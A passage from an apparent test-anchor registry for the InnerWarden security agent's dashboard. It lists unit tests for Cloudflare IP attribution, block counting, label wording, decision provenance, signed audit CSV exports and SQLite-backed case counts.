- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_rewrite_events_for_cloudflare_collapses_entities_too` - end-to-end Event-level rewrite: 3 CF-edge events with shared client collapse to 1 unique IP across BOTH `details.src_ip` AND `event.entities` (the EntityRef::ip that drives KG node creation). Dashboard "32 distinct attackers" rendering is driven off entities — rewriting only details would have left them stale.
- `crates/agent/src/cloudflare_attribution.rs::tests::wave9_rewrite_events_does_not_touch_non_cf_events` - mixed-batch invariant: in a batch with one CF event + one non-CF event, the rewrite touches ONLY the CF event. Anti-regression for accidentally widening the rewrite scope.

### Public block count semantics (Wave 10b - AUDIT-WAVE10B-NON-INCIDENT-BLOCKS anchor)

- `crates/agent/src/dashboard/live_feed.rs::tests::count_unique_ips_blocked_counts_honeypot_abuseipdb_blocks` - 3 honeypot AbuseIPDB block decisions with empty `real_ids` produce `total_blocked=3`. Pre-Wave-10b returned 0 because the function required `real_ids` membership; the operator hit "0 blocked" on the public site on 2026-05-05 while 450 real auto-blocks happened that day.
- `crates/agent/src/dashboard/live_feed.rs::tests::count_unique_ips_blocked_counts_repeat_offender_and_proto_anomaly` - the four other non-incident-pipeline auto-block paths (`repeat-offender:`, `proto_anomaly:`, `suspicious_archive:`, `logging_config_change:`) each contribute to the public count.
- `crates/agent/src/dashboard/live_feed.rs::tests::count_unique_ips_blocked_still_dedupes_across_incident_and_non_incident_paths` - same IP blocked via incident pipeline AND repeat-offender ladder counts ONCE. Anti-regression for double-counting after Wave 10b widened the classifier.
- `crates/agent/src/dashboard/live_feed.rs::tests::count_unique_ips_blocked_still_rejects_unknown_non_incident_shape` - decision with unknown `incident_id` shape and no `real_ids` match is rejected. Pins the conservative classifier — a future internal/research-only block path can't accidentally inflate the public counter.
- `crates/agent/src/dashboard/live_feed.rs::tests::is_public_block_decision_recognises_all_known_prefixes` - the allow-list of non-incident-pipeline `incident_id` prefixes is pinned. Adding a new auto-block path is a deliberate change to both the helper AND this test in the same PR.

### Number-consistency labels (Wave 10 - AUDIT-WAVE10-LABEL-HONESTY anchor)

- `crates/agent/src/dashboard/mod.rs::tests::wave10_home_activity_strip_reads_handled_not_stopped` - the home activity strip cell that aggregates Contained + Observing + Filtered out reads `Warden decisions` (spec 049 PR2, supersedes the Wave-10 interim `handled automatically`). Anti-regression: both `stopped automatically` (pre-Wave-10) and `handled automatically` (Wave-10 interim) must stay gone.

- `crates/agent/src/dashboard/mod.rs::tests::home_strip_uses_spec_049_metric_names_and_warden_branding` — spec 049 PR2 label contract. Home strip labels read `flagged by system` / `Warden decisions` / `needs review` / `Contained` / `Observing` / `Filtered out`. Pre-spec-049 labels (`flagged as suspicious`, `handled automatically`, `awaiting review`) must stay gone.

- `crates/agent/src/dashboard/mod.rs::tests::nav_tab_label_reads_cases_not_threats` — spec 049 PR3 top-nav rename. Main-nav button MUST render `Cases` (visible) + `Cases — audit ledger` (aria-label). Legacy strings (`>Threats</button>`, `Threat investigation`) must stay gone.

- `crates/agent/src/dashboard/mod.rs::tests::nav_more_menu_reads_briefings_not_report` — spec 049 PR3 More-menu rename. `Briefings` is the MSSP entregable per spec 049 §8.4; the legacy `Report` string must stay gone.

- `crates/agent/src/dashboard/mod.rs::tests::rename_keeps_internal_route_slugs_unchanged` — spec 049 PR3 backwards-compat guard. Internal slugs (`id="navInvestigate"`, `showView('investigate')`, `id="navReport"`, `showView('report')`) MUST survive the rename so bookmarked URLs, JS state, and deep links keep working. A future PR that renames the slugs MUST ship a redirect for the old paths in the same change.

- `crates/agent/src/dashboard/mod.rs::tests::cases_panel_header_does_not_use_threats_vocabulary` — spec 049 PR3 vocabulary rename. The "Unresolved Cases" headline lived on the Sensors page's gauge panel, deleted 2026-05-15 along with the rest of the Sensors page. The remaining contract is that operator-facing copy never reverts to `Unresolved Threats`. Tab rename pinned separately by `nav_tab_label_reads_cases_not_threats`.

- `crates/agent/src/dashboard/data_api.rs::tests::parse_hour_filter_accepts_in_range_pair` — spec 049 PR4 hour-filter validation: `parse_hour_filter` returns `Some((lo, hi))` only when both bounds present, both <= 23, and `lo <= hi`. Inclusive on both ends.

- `crates/agent/src/dashboard/data_api.rs::tests::parse_hour_filter_rejects_cross_midnight_range` — spec 049 PR4 deliberately does NOT support cross-midnight `lo > hi`. Operator picks two adjacent dates to span midnight. Anti-regression for a future "implement wrap" shortcut that would diverge from the documented contract.

- `crates/agent/src/dashboard/data_api.rs::tests::parse_hour_filter_rejects_out_of_range` — hour values >= 24 yield `None` (no filter). Malformed frontend client must not crash the backend or inflate counts.

- `crates/agent/src/dashboard/data_api.rs::tests::ts_passes_hour_filter_includes_boundary_hours` — inclusive on both ends: `14:00` passes `(14, 16)` and `16:59:59` passes `(14, 16)`. Pins the inclusive semantics so a future refactor can't silently switch to exclusive bounds.

- `crates/agent/src/dashboard/data_api.rs::tests::ts_passes_hour_filter_surfaces_invalid_ts_to_operator` — spec 049 PR4 honesty rule: an invalid `ts_ms` (out of chrono's representable range) returns `true` (include) so a data bug is operator-visible rather than silently filtered out.

- `crates/agent/src/dashboard/data_api.rs::tests::operator_timezone_prefers_env_var` — `TZ` env var wins over `/etc/timezone`. Spec 049 PR4 contract: operator-config TZ flows through to the picker label, never browser-derived.


- `crates/agent/src/dashboard/mod.rs::tests::state_js_carries_hour_filter_in_state_filters` — `state.filters` declares `hour_from: ''` and `hour_to: ''` with empty-string defaults so `buildQuery` skips them when the picker is empty (no stray `hour_from=` in the URL).

- `crates/agent/src/dashboard/mod.rs::tests::state_js_sync_validates_hour_range_at_ui_boundary` — `syncFiltersFromUi` mirrors the backend `parse_hour_filter` contract: both 0-23 AND `hour_from <= hour_to`. Validation at the UI boundary stops malformed values from reaching the backend.

- `crates/agent/src/dashboard/mod.rs::tests::state_js_persists_hour_filter_via_url` — `hydrateStateFromQuery` + `syncUrl` round-trip `hour_from`/`hour_to` through the URL so deep links survive a reload and share cleanly across MSSP analysts.

- `crates/agent/src/dashboard/mod.rs::tests::threats_js_passes_hour_filter_on_overview_queries` — BOTH refresh paths (`refreshLeft` + `refreshLeftLive`) pass `hour_from`/`hour_to` to `/api/overview`. Counts agreed by construction; if only one path threaded them through, the operator would see live vs manual numbers diverge (the recurring "Dashboard count != Site count" pattern).













- `crates/agent/src/dashboard/decision_provenance.rs::tests::decision_layer_serializes_as_snake_case_strings` — spec 049 PR9 wire-format contract. All 10 `DecisionLayer` variants serialize to fixed snake_case strings that the frontend keys on (`algorithm_gate` / `killchain_fast_path` / `correlation_rule` / `ai_local_warden` / `ai_llm` / `auto_rule` / `honeypot_post_session` / `observation_verifier` / `manual_operator` / `unknown`). Changing any string is a breaking change for the drill-down UI.

- `crates/agent/src/dashboard/decision_provenance.rs::tests::provider_takes_precedence_over_reason_heuristic` — anti-misclassification guard. When provider matches a specific path (e.g. `honeypot:*`) AND reason contains a heuristic keyword (e.g. `allowlist`), the provider wins. Pinned so a future "simplify the if-chain" refactor cannot accidentally flip precedence and misclassify honeypot decisions.

- `crates/agent/src/dashboard/decision_provenance.rs::tests::local_classifier_classifies_as_ai_local_warden` — spec 049 PR9 brand contract. Both `local_classifier` (legacy) and `local_warden` (PR3 rename) classify as `AiLocalWarden`. Detail line includes confidence when present.

- `crates/agent/src/dashboard/decision_provenance.rs::tests::empty_provider_falls_back_to_unknown_with_no_provider_recorded_note` — honesty contract. An empty `ai_provider` (KG-path decisions don't carry it) falls back to `Unknown` with an explicit "no provider recorded" detail. Anti-regression for a future "default to AI Local Warden" shortcut that would silently misclassify the KG path.

- `crates/agent/src/dashboard/mod.rs::tests::journey_js_renders_decision_provenance_block` — frontend invokes `renderDecisionProvenance` from the decision card and defines the `DECISION_LAYER_LABELS` map.

- `crates/agent/src/dashboard/mod.rs::tests::journey_js_decision_layer_labels_cover_every_backend_variant` — every backend `DecisionLayer` wire variant has a human-readable label in the frontend map. A new variant without a label renders the raw snake_case string (operator-unfriendly) — anchor catches that drift.

- `crates/agent/src/dashboard/mod.rs::tests::investigation_journey_decision_entry_carries_provenance_fields` — BOTH production journey paths (SQLite + KG fallback) inject `decision_layer` + `decision_layer_detail` on every decision JourneyEntry. Pinned by match count == 2 to prevent the "fixed in one path only" recurring-bug pattern.

- `crates/agent/src/dashboard/mod.rs::tests::app_css_defines_decision_provenance_block_styles` — `.decision-provenance` + label/badge/detail selectors. Without them the block renders unstyled.

- `crates/agent/src/dashboard/case_recurrence.rs::tests::recurrence_pattern_serializes_as_snake_case` — spec 049 PR10 wire-format contract. All 5 `RecurrencePattern` variants serialize to fixed snake_case strings (`single_burst` / `opportunistic` / `regular_scanner` / `targeted` / `unknown`). Frontend keys on these; changing any is a breaking change.

- `crates/agent/src/dashboard/case_recurrence.rs::tests::agent_unknown_with_one_visit_promotes_to_single_burst` — the agent's `classify_pattern` returns `unknown` on `visit_count < 2` (early-return). The drill-down promotes that to `SingleBurst` — more honest operator-facing label. Anti-regression for a future "just pass-through the agent label" simplification.

- `crates/agent/src/dashboard/case_recurrence.rs::tests::future_agent_label_falls_through_to_unknown` — forward-compat guard. A new agent classifier label (e.g. `swarm`) without updating this module's map renders as `Unknown` — visible, not silently misclassified.

- `crates/agent/src/dashboard/case_recurrence.rs::tests::returns_after_unblock_caps_at_visit_count_minus_one` — even with many retries (`total_blocks = 99`), `returns_after_unblock` is capped at `visit_count - 1`. Anti-inflation guard.

- `crates/agent/src/dashboard/mod.rs::tests::journey_js_renders_recurrence_block` — frontend defines `renderRecurrenceBlock` and the journey template invokes it with `j.recurrence`.

- `crates/agent/src/dashboard/mod.rs::tests::journey_js_recurrence_block_reads_backend_fields_directly` — render helper reads strictly from `rec.*` (backend-emitted), never derives from journey entries. Single source of truth: agent + `case_recurrence` own the math.

- `crates/agent/src/dashboard/mod.rs::tests::journey_js_recurrence_block_returns_empty_when_field_missing` — non-IP subjects / missing profiles render '' (nothing), NOT a fake "0 visits" panel. Honest absence.

- `crates/agent/src/dashboard/mod.rs::tests::investigation_journey_overlays_recurrence_block_for_ip_subjects` — `api_journey` invokes `overlay_recurrence_block` after spawn_blocking. Without the overlay, the builder's `recurrence: None` would stay in place and the frontend would never see the data.

- `crates/agent/src/dashboard/mod.rs::tests::app_css_defines_recurrence_block_styles` — `.recurrence-block` + eyebrow / badge / pill / returned / profile-link selectors. Without them the block renders unstyled.

- `crates/agent/src/dashboard/audit_export_csv.rs::tests::csv_quote_doubles_internal_quotes` — RFC 4180 escape. Pins the operator-readable behaviour for `reason` cells containing quoted strings (signature names, error messages). Anti-regression for a future "simplify the quote handling" that breaks CSV imports in Excel / pandas.

- `crates/agent/src/dashboard/audit_export_csv.rs::tests::export_emits_one_row_per_journey_entry` — wire-format contract for the audit CSV. Header row + one data row per journey entry. Pins column order so a future "reorder columns" refactor breaks loud (operators may have downstream tooling keyed on column index).

- `crates/agent/src/dashboard/audit_export_csv.rs::tests::reproducibility_hash_ignores_generated_at` — spec 049 §8.6 reproducibility contract: re-running the same export at a later time MUST produce the same hash. `generated_at` (which changes per export) is excluded from the hash.

- `crates/agent/src/dashboard/audit_export_csv.rs::tests::reproducibility_hash_is_key_order_insensitive` — content-equivalent snapshots with different serde insertion order hash the same. Canonicalisation via sorted-key traversal pinned.

- `crates/agent/src/dashboard/audit_export_csv.rs::tests::export_quotes_cells_with_internal_quotes` — operator's `reason` cell with internal quotes (e.g. `matched signature "DDoS-burst"`) escapes as `""` per RFC 4180.

- `crates/agent/src/dashboard/mod.rs::tests::investigation_api_export_dispatches_csv_format` — `build_export_response` dispatches on `format=csv`, sets `Content-Type: text/csv`, and emits `Content-Disposition: attachment; filename="innerwarden-audit-..."`. Without dispatch the operator gets JSON for a CSV button click.

- `crates/agent/src/dashboard/mod.rs::tests::threats_js_export_csv_button_routes_to_csv_format` — journey-page "Export Audit CSV" button wires to `downloadSnapshot('csv')`. Frontend → backend → operator deliverable in one click.

- `crates/agent/src/dashboard/mod.rs::tests::threats_js_download_snapshot_handles_csv_format` — `downloadSnapshot` emits the right extension, MIME, and `innerwarden-audit-` filename prefix for `format=csv`. MSSP deliverable convention pinned.

- `crates/agent/src/dashboard/audit_export_signing.rs::tests::load_or_generate_reuses_existing_key` — spec 049 PR12 keypair lifecycle: second call must reuse the persisted private key, not regenerate. Anti-regression for a future "always generate fresh" simplification that would invalidate every previously-shared public key fingerprint.

- `crates/agent/src/dashboard/audit_export_signing.rs::tests::private_key_file_has_0600_permissions_on_unix` — operator-private key file on Unix MUST be 0600. Anti-leak guard.

- `crates/agent/src/dashboard/audit_export_signing.rs::tests::malformed_key_file_is_moved_aside_and_regenerated` — wrong-length key file is renamed `.bak` and a fresh keypair is generated. Recovery without operator intervention.

- `crates/agent/src/dashboard/audit_export_signing.rs::tests::sign_base64_roundtrips_through_dalek_verification` — end-to-end sanity: a signature made by our signer verifies with ed25519-dalek's verifier against the same input bytes. Anchors the "operator's claim verifies" contract.

- `crates/agent/src/dashboard/audit_export_signing.rs::tests::pub_key_file_contains_base64_marker` — `.pub` file format `ed25519 <base64> innerwarden-audit-export` is the verification-recipe interface. Format change would break the operator's MSSP-client verification path.

- `crates/agent/src/dashboard/audit_export_csv.rs::tests::signed_csv_emits_signature_and_fingerprint_lines` — signed CSV variant includes `# Public key fingerprint` + `# Signature (ed25519, detached, base64)` + the openssl/cosign verification recipe in the metadata header.

- `crates/agent/src/dashboard/audit_export_csv.rs::tests::signed_csv_signature_verifies_with_dalek` — end-to-end: the signature in the CSV verifies against the reproducibility-hash bytes using the operator's public key. The wedge.

- `crates/agent/src/dashboard/audit_export_csv.rs::tests::unsigned_csv_with_warning_includes_loud_notice` — when signing key load fails, the CSV carries `# WARNING: This export is UNSIGNED` + `# Do not forward as audit evidence` so the operator notices instead of silently shipping unverifiable evidence.

- `crates/agent/src/dashboard/mod.rs::tests::audit_signing_route_registered` — `/api/audit-signing/public-key` route + handler must be wired in. Without the route, signed CSVs are unverifiable (recipient cannot fetch the key).

- `crates/agent/src/dashboard/mod.rs::tests::investigation_csv_export_path_invokes_signer` — production CSV path invokes `AuditSigner::load_or_generate` + `render_csv_export_signed` (or falls back to `render_csv_export_unsigned_with_warning`). Never silently emits unsigned without warning.

- `crates/agent/src/dashboard/mod.rs::tests::investigation_audit_signing_public_key_handler_defined` — `api_audit_signing_public_key` handler exists and uses the canonical `innerwarden-audit-signing.pub` filename in the Content-Disposition.

- `crates/agent/src/dashboard/mod.rs::tests::threats_js_outcome_meta_renames_dismissed_to_filtered_out` — spec 049 §5.5 rename completion. AI Defense Log group label reads `Filtered out` (not `Dismissed`). Both wire keys (`filtered_out`, `dismissed`) map to the same operator-facing label so backwards-compat with backend that still emits `outcome: "dismissed"` survives. Operator-reported gap 2026-05-13.

- `crates/agent/src/dashboard/mod.rs::tests::threats_js_group_label_for_scope_returns_past_period_variants` — spec 049 §8.2.D contract. When scope ≠ today, group titles read `Blocked during selected period` / `Observed during selected period` / `Honeypot during selected period` / `Needed review during selected period` / `Filtered out during selected period`. Operator-reported gap: "Currently blocked attackers" was lying when picker = yesterday.

- `crates/agent/src/dashboard/mod.rs::tests::threats_js_unit_disambig_emits_both_units_when_diverge` — `unitDisambigFromItems` emits `N attackers · M cases` only when the two counts diverge; singular/plural handled (1 attacker · 1 case, not 1 attackers · 1 cases). Resolves operator-reported reconciliation gap 2026-05-13: Home strip shows cases, Cases AI Defense Log shows unique attackers, no disambiguation visible.

- `crates/agent/src/dashboard/mod.rs::tests::threats_js_ai_defense_log_title_carries_unit_disambig_subtitle` — AI Defense Log title gains `· 50 attackers · 170 cases` subtitle when units diverge so operator reconciles Home's "170 Flagged by system" against the smaller attacker count at a glance.

- `crates/agent/src/dashboard/mod.rs::tests::threats_js_group_header_uses_scope_aware_label_in_render` — render loop reads group label via `groupLabelForScope(o, scope)` rather than hard-coding `meta.label`. Anti-regression for a simplification that reverts to always-now labels even when scope = past.

- `crates/agent/src/dashboard/mod.rs::tests::home_js_defines_view_activity_scoped_handoff` — spec 049 PR14 Home strip click handoff. `viewActivityScoped(bucket)` is defined and sets `state.filterOutcome` to the requested bucket (default `'all_flagged'`).

- `crates/agent/src/dashboard/mod.rs::tests::home_strip_cards_route_to_scoped_buckets` — the 4 Home strip cards wire to `viewActivityScoped` with specific buckets: `all_flagged` / `warden_decisions` / `needs_review`. Events Watched stays on Sensors tab. Operator clicks the big number on Home and Cases opens already scoped.

- `crates/agent/src/dashboard/mod.rs::tests::home_subbreakdown_chips_route_to_scoped_buckets` — the 3 sub-breakdown chips (Contained / Observing / Filtered out) wire to their respective buckets via `viewActivityScoped('<bucket>')`. Closes the spec 049 §6.2 reconciliation contract end to end.

- `crates/agent/src/dashboard/mod.rs::tests::threats_js_filter_branches_handle_all_pr14_buckets` — `buildGroupedList` filter handles all 4 new buckets (`warden_decisions`, `needs_review`, `observing`, `filtered_out`). Without the branches, the operator clicks "Warden decisions" and sees the full unfiltered list.

- `crates/agent/src/dashboard/mod.rs::tests::threats_js_scoped_title_has_clear_link_per_bucket` — each scoped Cases title carries the `✕ show all` clear-link so the operator escapes the filter with one click, and renders the operator-readable title per bucket (`Contained threats` / `Warden decisions` / `Needs review` / `Flagged by system`).

- `crates/agent/src/dashboard/mod.rs::tests::home_strip_reads_backend_counters_not_frontend_bucket_sum` — `renderActivityStrip` reads `overview.flagged_by_system_count` / `warden_decisions_count` / `filtered_out_count` directly. Pre-spec-049 the frontend summed `snap.buckets.X.unique_attackers` itself, which drifted across refactors and silently dropped dismissed. Backend now owns the math contract (case_metrics.rs); a future revert to frontend math fails this anchor.

- `crates/agent/src/dashboard/mod.rs::tests::home_strip_breakdown_chips_render_leaf_outcome_counters` — the three sub-breakdown chips (Contained · Observing · Filtered out) read the leaf counters whose backend-guaranteed sum equals `warden_decisions_count`. Pin prevents a future rewire from breaking the visible reconciliation (chip total != big number above).

- `crates/agent/src/dashboard/mod.rs::tests::app_css_defines_home_activity_breakdown_styles` — `.home-activity-breakdown` + chip / num / label / sep selectors must exist. Without them the chips render as inline plain text.

- `crates/agent/src/dashboard/mod.rs::tests::pr15_threats_js_renders_still_active_now_pill_for_past_scope` — spec 049 PR15. The literal "Still active now" pill string + `badge-still-active` CSS class live in `threats.js`. Closes the operator gap "contained ontem — e hoje?" with plain-English copy.

- `crates/agent/src/dashboard/mod.rs::tests::pr15_still_active_now_pill_is_gated_on_past_scope_and_blocked_now` — pill paints only when `casesScopeFromDate(state.filters.date) === 'past'` AND `block_state.kind === 'blocked_now'`. Today-scope keeps the existing outcome badge (no duplicate signal); `blocked_historical` keeps the existing EXPIRED pill.

- `crates/agent/src/dashboard/mod.rs::tests::pr15_incident_view_exposes_still_active_now_field` — `IncidentView.still_active_now: Option<bool>` with `skip_serializing_if = Option::is_none`. External `/api/incidents` auditors get a single boolean answering "is yesterday's block still live today" without a second `xdp_block_times` roundtrip; today-scope and expired-block past rows omit the field entirely so the JSON payload stays small.

- `crates/agent/src/dashboard/mod.rs::tests::pr15_data_api_decorates_past_scope_responses` — `compute_incidents_blocking` gates the decoration on `scope_is_past`, uses `build_still_active_map` (batched, deduped per request) and `row_still_active` (per-row Option contract). Pin guards latency and JSON-shape contract simultaneously.

- `crates/agent/src/dashboard/mod.rs::tests::pr15_app_css_defines_still_active_badge` — `.badge-still-active` rule exists in `app.css`. Without it the pill renders unstyled and the operator loses the affordance.

- `crates/agent/src/dashboard/decision_provenance.rs::tests::obvious_gate_provider_classifies_as_algorithm_gate` — `provider == "obvious-gate"` from `incident_obvious.rs` classifies as `AlgorithmGate` with detail `obvious-threat fast path (threat_intel match)`. Operator-reported 2026-05-13: real prod block of 41.242.115.84 was rendering "Unknown (provider: obvious-gate)" in the Cases drill-down.

- `crates/agent/src/dashboard/decision_provenance.rs::tests::noise_gate_provider_classifies_as_algorithm_gate` — `provider == "noise-gate"` from `incident_autodismiss.rs` classifies as `AlgorithmGate` with detail `noise filter (low-severity auto-dismiss)`. Pair to obvious-gate above.

- `crates/agent/src/dashboard/mod.rs::tests::pr16_algorithm_gate_provider_strings_stay_in_sync_with_prod_writers` — cross-file source-grep anchor: the literal `"obvious-gate"` lives in `incident_obvious.rs`, the literal `"noise-gate"` lives in `incident_autodismiss.rs`, and the classifier in `decision_provenance.rs` branches on the same lowercase strings. Renaming any side without the other fails the build instead of silently demoting prod drill-downs to "Unknown".

- `crates/store/src/incidents.rs::tests::incidents_since_ts_returns_rows_at_or_after_start` — boundary anchor for the boot-replay primitive. `incidents_since_ts(midnight)` includes the exact-midnight row and excludes the prior day. Operator-reported on 2026-05-13: after two same-day deploys the Cases panel showed 141 KG nodes vs 535 SQLite rows because there was no boot-time replay; the off-by-one `>` would silently lose the 00:00 incident on every restart.

- `crates/store/src/incidents.rs::tests::incidents_since_ts_returns_ordered_by_ts` — replay walks rows in chronological order so the ingestion log is readable and downstream graph relationships (TriggeredBy edges that assume time-monotonic ingest) stay consistent.

- `crates/store/src/incidents.rs::tests::incidents_since_ts_respects_limit` — the boot path caps at `MAX_BOOT_REPLAY` so a pathological day cannot pin agent startup.

- `crates/store/src/incidents.rs::tests::incidents_since_ts_returns_empty_for_malformed_timestamp` — garbage `start_ts` (`"not-a-ts"`) returns empty rather than panicking or inflating; guards against config-typo failure modes during early boot.

- `crates/agent/src/dashboard/mod.rs::tests::pr18_store_exposes_incidents_since_ts` — source-grep on `store/src/incidents.rs` asserting `pub fn incidents_since_ts(...)` and the `WHERE ts >= ?1 ORDER BY ts ASC` SQL exist. A rename without lockstep boot.rs update breaks here loudly.

- `crates/agent/src/dashboard/mod.rs::tests::pr18_boot_path_replays_todays_incidents_into_kg` — source-grep on `loops/boot.rs` asserting the boot path calls `store.incidents_since_ts(...)`, iterates into `g.ingest_incident(inc)`, and carries `MAX_BOOT_REPLAY` as the cap. Pins the contract operator caught on 2026-05-13: KG must mirror SQLite after restart.

- `crates/agent/src/dashboard/mod.rs::tests::pr18_replay_primitive_is_idempotent_on_repeat` — running the replay twice over the same data must not double-count KG nodes. Relies on `ingest_incident`'s `upsert_node` semantics on `incident_id`. Without this invariant, every boot would double the surviving overlap between snapshot and SQLite.

- `crates/agent/src/dashboard/decision_provenance.rs::tests::classify_decision_layer_prefers_pinned_over_heuristic` — spec 049 PR17 contract: when a writer pins `decision_layer`, the classifier must trust it even when the heuristic would have produced a different answer. Without this, the entire write-time-pinning design is decorative.

- `crates/agent/src/dashboard/decision_provenance.rs::tests::classify_decision_layer_falls_back_to_heuristic_when_no_pin` — pre-PR17 JSONL entries (no `decision_layer` field, serde defaults to `None`) must still classify correctly via the heuristic. Anti-regression for the legacy compatibility path.

- `crates/agent/src/dashboard/decision_provenance.rs::tests::classify_decision_layer_falls_back_to_heuristic_on_unknown_pinned_string` — defensive: a writer that ships a typo or future-version-only layer string must not crash the drill-down. The heuristic kicks in and produces a useful answer instead of "writer typed gibberish".

- `crates/agent/src/dashboard/decision_provenance.rs::tests::from_pinned_str_covers_every_layer_variant` — round-trip pin: every `DecisionLayer` variant must parse back from its `as_str()` form via `from_pinned_str`. A new variant added without updating `from_pinned_str` fails here loudly instead of silently rejecting valid pins.

- `crates/agent/src/dashboard/mod.rs::tests::pr17_struct_carries_decision_layer_field` — source-grep on `decisions.rs` asserting `DecisionEntry` carries `decision_layer: Option<String>` with the `#[serde(default, skip_serializing_if = "Option::is_none")]` attributes. Pre-PR17 JSONL must still deserialise; fresh test entries must stay compact.

- `crates/agent/src/dashboard/mod.rs::tests::pr17_classifier_exposes_pinned_first_entry_point` — source-grep on `decision_provenance.rs` asserting `classify_decision_layer` (the pinned-first entry point) exists and calls `from_pinned_str`. Removing the function would force callers back to the legacy `*_from_fields` path and regress the bug class PR17 closes.

- `crates/agent/src/dashboard/mod.rs::tests::pr17_investigation_read_path_passes_pinned_field` — source-grep on `investigation.rs` asserting the prod read-path call site extracts `decision_layer` from the parsed decision JSON and calls `classify_decision_layer`. Without this the pinned field is persisted but the drill-down silently ignores it.

- `crates/agent/src/dashboard/mod.rs::tests::pr17_every_prod_writer_sets_decision_layer` — cross-file source-grep across 20 prod writer files (incident_obvious, incident_autodismiss, killchain_inline, correlation_response, narrative_observation_verify, honeypot_always_on, honeypot_post_session, bot_actions, dashboard/actions, process/incidents, etc.). Each must pin `decision_layer` via struct-literal field, `.decision_layer = ` assignment, or routing through `decisions::build_entry` (which auto-pins from the AI provider name). A new writer landing without any of these forms fails this anchor at CI.

- `crates/agent/src/dashboard/cases_from_sqlite.rs::tests::cases_returns_every_sensor_incident_for_the_date` — spec 049 PR20 hot-path anchor. The Cases tab MUST show every today-row from SQLite, no eviction. Pinned the 2026-05-13 prod regression: 480 in `/api/overview` (SQLite) vs 68 in `/api/incidents` (KG-walked, capped at 50 MB).

- `crates/agent/src/dashboard/cases_from_sqlite.rs::tests::cases_synthesises_view_for_honeypot_abuseipdb_orphan_decision` — Wave-10b anchor. A decision with `incident_id = "honeypot:always-on:abuseipdb:<ip>"` and NO matching `incidents` row must still surface in Cases. Pre-PR20 these were invisible to the operator dashboard while the site counted them.

- `crates/agent/src/dashboard/cases_from_sqlite.rs::tests::cases_does_not_synthesise_for_unknown_orphan_prefix` — defensive: future writer shipping a new non-incident path with an unrecognised prefix must NOT silently spawn implausible rows. Operator can file an issue; new prefix gets added to the allow-list deliberately.

- `crates/agent/src/dashboard/cases_from_sqlite.rs::tests::cases_attaches_decision_to_sensor_incident_when_both_exist` — standard prod path: sensor wrote the incident, AI router wrote a decision pointing at the same `incident_id`. The Cases row must reflect the action, not "Awaiting analysis".

- `crates/agent/src/dashboard/cases_from_sqlite.rs::tests::cases_excludes_prior_day_incidents` — boundary anchor: scope is a single calendar day (UTC). Yesterday's 23:59 must not bleed into today.

- `crates/agent/src/dashboard/cases_from_sqlite.rs::tests::is_non_incident_pipeline_prefix_covers_wave_10b_set` — allow-list anchor for the six documented prefixes (honeypot:always-on:abuseipdb:, honeypot:abuseipdb:, repeat-offender:, proto_anomaly:, suspicious_archive:, logging_config_change:). Adding a new prefix means adding it here AND in the function in lockstep.

- `crates/agent/src/dashboard/cases_from_sqlite.rs::tests::synth_severity_defaults_to_high_for_block_actions` — a block_ip auto-decision without `estimated_threat` is never "low" — the blocked IP is by definition something the system felt strongly about enough to enforce a kernel rule.

- `crates/agent/src/dashboard/mod.rs::tests::pr20_cases_handler_reads_sqlite_not_kg` — source-grep on `data_api.rs` asserting `compute_incidents_blocking` calls `cases_from_sqlite::build_cases_for_date` and does NOT walk `graph.nodes_of_type(NodeType::Incident)` for the listing. The KG path is preserved for journey/drill-down queries.

- `crates/agent/src/dashboard/mod.rs::tests::pr20_overview_counts_filter_cloudflare_self_traffic` — spec 049 PR20 fix for the operator-reported 2026-05-13 strip/panel mismatch: "1 Currently observing" with no row to drill into because the 1 IP (172.70.80.132) was Cloudflare. Overview counts must call `cloud_safelist::is_self_traffic_ip` so strip and panel agree.



- `crates/agent/src/dashboard/mod.rs::tests::pr20_sensors_status_drops_dead_jsonl_probes` — `/api/status.files` must NOT advertise the events / incidents JSONL probes that spec-016 (commit 8bd59990, 2026-04-12) removed. Probing for them surfaced a misleading "events: not found" on the Sensors HUD.

- `crates/agent/src/dashboard/sensors.rs::tests::api_status_files_no_longer_advertises_dead_jsonl_streams` — same contract, struct-level. Replaces the legacy `test_sensors_system_status_mapping` test which pinned the OPPOSITE direction (asserting the dead probes existed).

- `crates/agent/src/dashboard/mod.rs::tests::pr22_overview_events_count_reads_canonical_counter_not_edge_count` — spec 049 PR22+PR30 anti-regression: `/api/overview.events_count` must NOT use `metrics.edge_count` (the ~30× inflation proxy from the pre-PR22 era) and must reach `Store::events_count_for_date` via `canonical_counts::compute` (PR30 path, not directly). Operator-reported 2026-05-13: 130k vs 3.7k for the same KG.

- `crates/agent/src/dashboard/mod.rs::tests::pr22_canonical_counts_module_exists_and_is_wired` — source-grep on `canonical_counts.rs` asserting `CanonicalCounts` struct + `compute()` entry point + canonical events counter (PR30 pins the SQLite per-date source).

- `crates/agent/src/dashboard/mod.rs::tests::pr30_every_dashboard_endpoint_reads_canonical_counts` — cross-endpoint source-grep: `data_api.rs` and `sensors.rs` must both reach events_today via `canonical_counts::compute`. A future handler that inlines a bespoke SQLite/KG read for `events_today` re-introduces the cross-surface divergence pattern PR22 set out to kill.

- `crates/agent/src/dashboard/consistency_incidents_today.rs::pr30_events_today_agrees_between_overview_and_sensors_payloads` — runtime cross-endpoint contract: seeds SQLite with 7 events for today + poisons the KG counter to 9_999, asserts both surfaces (canonical_counts::compute and build_sensors_payload) report 7. Any future regression to `graph.total_events_ingested` fails this with a 7 vs 9999 message.

- `crates/agent/src/dashboard/mod.rs::tests::pr22_frontend_no_longer_double_filters_trusted_ips` — frontend `state.hideAllowlisted` JS filter body is gone. Backend is the single source of truth; the JS layer doing it again caused the 2026-05-13 strip-vs-panel mismatch.

- `crates/agent/src/dashboard/canonical_counts.rs::tests::canonical_counts_returns_zero_for_clean_store` — empty-store no-panic anchor. Boot path on a clean install must not crash.

- `crates/agent/src/dashboard/canonical_counts.rs::tests::canonical_counts_aggregates_one_blocked_incident` — single incident + block_ip decision must land 1 in each: incidents_today, blocked_attackers, unique_attackers_today, flagged_by_system, warden_decisions.

- `crates/agent/src/dashboard/canonical_counts.rs::tests::canonical_counts_excludes_self_traffic_ips` — Cloudflare-edge IPs and RFC1918 must not inflate any counter (PR20+PR21 contract end-to-end).

